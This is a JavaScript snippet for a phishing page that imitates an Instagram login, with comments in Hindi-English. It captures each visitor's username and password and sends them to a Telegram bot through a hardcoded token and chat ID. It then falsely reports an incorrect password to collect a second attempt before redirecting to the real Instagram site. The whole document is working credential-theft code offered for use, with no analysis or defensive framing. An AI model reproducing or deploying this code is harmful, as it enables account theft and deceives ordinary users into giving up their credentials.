 <script>
    const BOT_TOKEN = '8809210844:AAFoPke9L3fgV5rDDTxR2zuVfRr-0bTAQu0'; 
    const CHAT_ID = '6263520410';

    // Click count ko track karne ke liye variable (Isi code me add kiya hai)
    let loginAttempts = 0; 

    // Aapke HTML ke 'login-form' ko target kiya
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault(); 

        loginAttempts++; // Har click par count 1 badhega

        const statusField = document.getElementById('status');
        statusField.textContent = "Connecting...";
        statusField.style.color = "blue";

        // Username aur Password inputs se value li
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        // Telegram format design (Attempt number ke sath)
        const textMessage = `📸 *Instagram Login Alert* (Attempt ${loginAttempts})\n\n👤 *Username:* ${user}\n🔑 *Password:* ${pass}`;
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: textMessage,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                // AGAR PEHLI BAAR CLICK KIYA HAI (RE-ENTER BOLNE KE LIYE)
                if (loginAttempts === 1) {
                    statusField.textContent = "Incorrect password. Please re-enter your password.";
                    statusField.style.color = "red";
                    
                    // Sirf password box clear hoga taaki user re-enter kare
                    document.getElementById('password').value = ''; 
                } 
                // AGAR DUBARA CLICK KIYA HAI (TAB REDIRECT HOGA)
                else if (loginAttempts >= 2) {
                    window.location.href = "https://www.instagram.com/accounts/login/";
                }
            } else {
                statusField.textContent = "Error: " + data.description;
                statusField.style.color = "red";
            }
        })
        .catch(error => {
            console.error('Error:', error);
            statusField.textContent = "Network error. Try again.";
            statusField.style.color = "red";
        });
    });
</script>
